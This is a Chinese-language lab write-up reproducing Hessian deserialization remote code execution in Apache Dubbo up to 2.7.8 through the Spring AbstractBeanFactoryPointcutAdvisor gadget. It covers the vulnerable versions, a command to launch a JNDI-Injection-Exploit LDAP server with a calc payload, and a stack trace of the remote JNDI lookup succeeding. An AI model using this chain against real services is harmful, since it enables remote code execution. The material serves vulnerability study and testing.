### 影响范围
<= 2.7.8
如果不加额外配置，在默认配置情况下在2.7.8依然可以利用此漏洞。


### 反序列化Gadget之SpringAbstractBeanFactoryPointcutAdvisor
这里主要说之`SpringAbstractBeanFactoryPointcutAdvisor`这个依赖率大的gadget。

关于各个Gadget：
> 这里需要注意的是几个Gadget的的点，基于hessian反序列支持SpringPartiallyComparableAdvisorHolder, SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean, Resin，其中
1. SpringPartiallyComparableAdvisorHolder 需要aspectj,默认的webx或者dubbo admin并没有这个jar包，功能方面需要开启aspectj 注解模式，对spring配置aop:aspectj-autoproxy。

2. SpringAbstractBeanFactoryPointcutAdvisor 需要高版本spring-aop，参考：https://github.com/mbechler/marshalsec/issues/8

3. Rome不自带，除非业务使用了webx框架，并且主动添加

4. Xbean不自带，除非业务使用了webx框架，并且主动添加

5. Resin，在应用服务器为resin时，直接具备包。



### Demo
环境搭建：
https://github.com/apache/dubbo-spring-boot-project
修改根路径下的pom.xml文件中`properties`标签中的`revision`属性为指定的dubbo版本，然后启动`DubboAutoConfigurationProviderBootstrap`类，即可启动指定版本的Dubbo。
修改`dubbo-spring-boot-parent\pom.xml`文件中的
```
<spring-boot.version>1.5.22.RELEASE</spring-boot.version>
```
为指定版本即可修改相应的spring-aop和spring-context的版本。
```
spring-boot的1.3.1.RELEASE对应4.2.4.RELEASE
spring-boot的1.3.4.RELEASE对应4.2.6.RELEASE
spring-boot的1.5.22.RELEASE对应4.3.25.RELEASE
spring-boot的2.1.3.RELEASE对应5.1.5.RELEASE
spring-boot的2.3.0.RELEASE对应5.2.6.RELEASE
```
（以上版本都可以利用成功。）

至此，漏洞环境搭建完成。

![image.png]()

![image.png]()

启动ldap服务和HTTP服务：
```
java -jar C:\Users\Administrator\Downloads\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc
```


![dubbopocspringxbean.gif]()
调用成功之后的调用栈：
```java
2021-03-16 17:48:00.832  WARN 77624 --- [erverWorker-3-1] o.a.dubbo.rpc.protocol.dubbo.DubboCodec  :  [DUBBO] Decode request failed: Invalid bean definition with name 'ldap://192.168.150.1:1389/jx2x1q' defined in JNDI environment: JNDI lookup failed; nested exception is javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: ExecTemplateJDK8 cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'jx2x1q', dubbo version: 2.7.8, current host: 192.168.85.1

org.springframework.beans.factory.BeanDefinitionStoreException: Invalid bean definition with name 'ldap://192.168.150.1:1389/jx2x1q' defined in JNDI environment: JNDI lookup failed; nested exception is javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: ExecTemplateJDK8 cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'jx2x1q'
	at org.springframework.jndi.support.SimpleJndiBeanFactory.getBean(SimpleJndiBeanFactory.java:129) ~[spring-context-5.2.6.RELEASE.jar:5.2.6.RELEASE]
	at org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor.getAdvice(AbstractBeanFactoryPointcutAdvisor.java:127) ~[spring-aop-5.2.6.RELEASE.jar:5.2.6.RELEASE]
	at org.springframework.aop.support.AbstractPointcutAdvisor.equals(AbstractPointcutAdvisor.java:76) ~[spring-aop-5.2.6.RELEASE.jar:5.2.6.RELEASE]
	at java.util.HashMap.putVal(HashMap.java:635) ~[na:1.8.0_172]
	at java.util.HashMap.put(HashMap.java:612) ~[na:1.8.0_172]
	at com.alibaba.com.caucho.hessian.io.MapDeserializer.doReadMap(MapDeserializer.java:145) ~[dubbo-2.7.8.jar:2.7.8]
	at com.alibaba.com.caucho.hessian.io.MapDeserializer.readMap(MapDeserializer.java:126) ~[dubbo-2.7.8.jar:2.7.8]
	at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2733) ~[dubbo-2.7.8.jar:2.7.8]
	at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2308) ~[dubbo-2.7.8.jar:2.7.8]
	at org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput.readObject(Hessian2ObjectInput.java:94) ~[dubbo-2.7.8.jar:2.7.8]
	at org.apache.dubbo.common.serialize.ObjectInput.readEvent(ObjectInput.java:83) ~[dubbo-2.7.8.jar:2.7.8]
	at org.apache.dubbo.remoting.exchange.codec.ExchangeCodec.decodeEventData(ExchangeCodec.java:400) [dubbo-2.7.8.jar:2.7.8]
	at org.apache.dubbo.rpc.protocol.dubbo.DubboCodec.decodeBody(DubboCodec.java:122) ~[dubbo-2.7.8.jar:2.7.8]
	at org.apache.dubbo.remoting.exchange.codec.ExchangeCodec.decode(ExchangeCodec.java:122) [dubbo-2.7.8.jar:2.7.8]
	at org.apache.dubbo.remoting.exchange.codec.ExchangeCodec.decode(ExchangeCodec.java:82) [dubbo-2.7.8.jar:2.7.8]
	at org.apache.dubbo.rpc.protocol.dubbo.DubboCountCodec.decode(DubboCountCodec.java:48) [dubbo-2.7.8.jar:2.7.8]
	at org.apache.dubbo.remoting.transport.netty4.NettyCodecAdapter$InternalDecoder.decode(NettyCodecAdapter.java:85) [dubbo-2.7.8.jar:2.7.8]
	at io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:501) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:440) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:650) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:576) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) [netty-all-4.1.49.Final.jar:4.1.49.Final]
	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_172]
Caused by: javax.naming.NamingException: problem generating object using object factory
	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1092) ~[na:1.8.0_172]
	at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542) ~[na:1.8.0_172]
	at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177) ~[na:1.8.0_172]
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205) ~[na:1.8.0_172]
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94) ~[na:1.8.0_172]
	at javax.naming.InitialContext.lookup(InitialContext.java:417) ~[na:1.8.0_172]
	at org.springframework.jndi.JndiTemplate.lambda$lookup$0(JndiTemplate.java:157) ~[spring-context-5.2.6.RELEASE.jar:5.2.6.RELEASE]
	at org.springframework.jndi.JndiTemplate.execute(JndiTemplate.java:92) ~[spring-context-5.2.6.RELEASE.jar:5.2.6.RELEASE]
	at org.springframework.jndi.JndiTemplate.lookup(JndiTemplate.java:157) ~[spring-context-5.2.6.RELEASE.jar:5.2.6.RELEASE]
	at org.springframework.jndi.JndiTemplate.lookup(JndiTemplate.java:179) ~[spring-context-5.2.6.RELEASE.jar:5.2.6.RELEASE]
	at org.springframework.jndi.JndiLocatorSupport.lookup(JndiLocatorSupport.java:96) ~[spring-context-5.2.6.RELEASE.jar:5.2.6.RELEASE]
	at org.springframework.jndi.support.SimpleJndiBeanFactory.getBean(SimpleJndiBeanFactory.java:119) ~[spring-context-5.2.6.RELEASE.jar:5.2.6.RELEASE]
	... 35 common frames omitted
Caused by: java.lang.ClassCastException: ExecTemplateJDK8 cannot be cast to javax.naming.spi.ObjectFactory
	at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163) ~[na:1.8.0_172]
	at javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:189) ~[na:1.8.0_172]
	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1085) ~[na:1.8.0_172]
	... 46 common frames omitted
```

从这三行来看：
```java
	at org.springframework.jndi.support.SimpleJndiBeanFactory.getBean(SimpleJndiBeanFactory.java:129) ~[spring-context-5.2.6.RELEASE.jar:5.2.6.RELEASE]
	at org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor.getAdvice(AbstractBeanFactoryPointcutAdvisor.java:127) ~[spring-aop-5.2.6.RELEASE.jar:5.2.6.RELEASE]
	at org.springframework.aop.support.AbstractPointcutAdvisor.equals(AbstractPointcutAdvisor.java:76) ~[spring-aop-5.2.6.RELEASE.jar:5.2.6.RELEASE]
```
知道这里的利用依赖`spring-context`和`spring-aop`。
继续探究版本问题，究竟哪些版本可以利用，哪些不行。



### TODO
据作者说的新的Gadget：
`com/alibaba/citrus/springext/util/SpringExtUtil`
项目地址：
https://github.com/webx/citrus/blob/master/common/springext/src/main/java/com/alibaba/citrus/springext/util/SpringExtUtil.java

